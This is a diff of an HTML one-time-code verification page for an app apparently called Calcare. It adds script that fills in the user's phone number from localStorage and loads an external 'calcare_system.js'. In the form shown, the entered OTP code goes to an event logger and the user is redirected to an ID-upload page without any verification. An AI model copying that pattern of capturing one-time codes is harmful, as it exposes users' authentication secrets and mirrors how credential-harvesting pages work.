@@ -282,7 +282,7 @@
         <h2>Verify your mobile number</h2>
         <p class="sub-text">Verification code has been sent to:</p>
 
-        <div class="phone-number">+254 (0) 758-716-026</div>
+        <div class="phone-number" id="otpPhoneDisplay">+254 (0) 712-345-678</div>
         <button class="change-phone" onclick="window.history.back()">CHANGE PHONE NUMBER</button>
 
         <form style="width: 100%;" onsubmit="logCalcareEvent('Submitted OTP Code', { code: document.getElementById('smsCode').value }); event.preventDefault(); window.location.href='id_upload.html';">
@@ -320,6 +320,23 @@
 </div>
 
     <script>
+        // Populate real user phone number
+        document.addEventListener('DOMContentLoaded', () => {
+            const storedPhone = localStorage.getItem('calcare_phone');
+            const displayEl = document.getElementById('otpPhoneDisplay');
+            if (storedPhone && displayEl) {
+                let p = storedPhone.replace(/\D/g, '');
+                if (p.startsWith('254') && p.length >= 12) p = p.substring(3);
+                if (p.startsWith('0') && p.length >= 10) p = p.substring(1);
+                
+                if (p.length === 9) {
+                    displayEl.textContent = '+254 (0) ' + p.substring(0, 3) + '-' + p.substring(3, 6) + '-' + p.substring(6);
+                } else {
+                    displayEl.textContent = '+254 (0) ' + storedPhone;
+                }
+            }
+        });
+
         // Simple countdown timer logic
         let timeLeft = 166;
         const timerElement = document.getElementById('timer');
@@ -1135,6 +1152,8 @@
         </div>
     </a>
 
+    <!-- Master System Enforcement -->
+    <script src="calcare_system.js"></script>
 </body>
 
 </html>
